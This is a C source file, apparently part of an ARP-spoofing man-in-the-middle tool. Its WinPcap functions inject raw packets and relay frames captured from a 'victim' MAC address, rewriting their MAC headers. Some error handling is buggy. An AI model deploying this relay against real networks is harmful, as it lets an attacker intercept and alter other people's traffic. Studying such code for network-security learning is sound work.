#include "send.h"

void send(pcap_if_t *dev, u_char* packet, int pack_size) {

	static pcap_t *pcap_handle;
	char errbuf[PCAP_ERRBUF_SIZE];

	//src, dst, mac, ip 설정해준다음에 샌드해주면됨 

	/* Open the output device */
	if (dev != NULL) {
		if ((pcap_handle = pcap_open(dev->name,            // name of the device
			65536,                // portion of the packet to capture (only the first 100 bytes)
			PCAP_OPENFLAG_PROMISCUOUS,  // promiscuous mode
			1000,               // read timeout
			NULL,               // authentication on the remote machine
			errbuf              // error buffer
			)) == NULL)
		{
			fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", dev->name);
			return;
		}
	}

	if (packet == NULL) return;

	if (pcap_sendpacket(pcap_handle, packet, pack_size) != 0)
	{
		fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(pcap_handle));
		return;
	}
}

int relay_send(pcap_if_t *d, input** str, char *power)
{
	char errbuf[PCAP_ERRBUF_SIZE] = { 0 };
	int i = 0;
	static pcap_t *descr = NULL;
	bpf_u_int32 netaddr = 0, mask = 0;
	eth_hdr *ethhdr = NULL;
	struct pcap_pkthdr *pkthdr;
	const u_char *packet = NULL;
	u_char relay_packet[LIBNET_MAX_PACKET];
	int target_count = (*str)->data_check;
	int j = 0;
	int result;

	/* Open network device for packet capture */
	if (d != NULL) {
		if ((descr = pcap_open_live(d->name, 2048, 0, 512, errbuf)) == NULL) {
			fprintf(stderr, "ERROR: %s\n", errbuf);
			exit(1);
		}
		if (pcap_lookupnet(d->name, &netaddr, &mask, errbuf) == -1) {
			fprintf(stderr, "ERROR: %s\n", errbuf);
			exit(1);
		}
	}
	if (power == NULL) return 0;

	while (1) { // victim ip sending > 
		result = pcap_next_ex(descr, &pkthdr, &packet);
		if (result == 0)continue;
		else if (result < 0) break;
		if (packet == NULL) {  /* Get one packet */
			fprintf(stderr, "ERROR: Error getting the packet.\n", errbuf);
			exit(1);
		}

		ethhdr = (eth_hdr *)(packet); /* Point to the eth header */
		for (j = 0; j < target_count; j++){
			for (i = 0; i < ETHER_ADDR_LEN; i++)
				if (ethhdr->src[i] != (*(str + j))->victim_mac[i]/*victim mac*/ &&
					ethhdr->dst[i] != (*(str + j))->my_mac[i]/*my mac*/ 
					) break;
				else {

					for (i = 0; i < ETHER_ADDR_LEN; i++){
						relay_packet[i] = (*(str + j))->destination_mac[i]; // reset dst mac
						relay_packet[i + 6] = (*(str + j))->my_mac[i]; // reset src mac
					}
					for (i = ETHER_ADDR_LEN * 2; i < pkthdr->caplen; i++) relay_packet[i] = *(packet + i); // set packet
					send(NULL, relay_packet, pkthdr->caplen);
				}
		}
	}
	return 1;
}